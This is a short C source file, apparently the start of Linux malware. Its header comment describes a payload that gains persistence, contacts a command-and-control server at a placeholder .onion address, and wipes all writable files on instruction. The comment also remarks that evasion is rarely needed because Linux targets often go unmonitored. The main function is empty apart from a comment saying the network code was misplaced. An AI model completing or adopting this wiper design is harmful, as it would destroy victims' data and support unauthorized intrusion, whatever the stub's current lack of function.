#include <stdio.h>
#include <stdlib.h>

/* 
 * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
 * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and wipe all writable files.
 * Functionality to copy files before wiping them will be a nice addition at some point in the future.
 * 
 * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many targets do not have monitoring solutions on Linux servers/workstations.
 * */

// Globals:

int CPORT = 5678;
char * CADDRESS = "sample-string.onion";

int main(int argc, char * argv[]) {
	
	// I have misplaced the web request code I was going to start with...

	return 0;
}
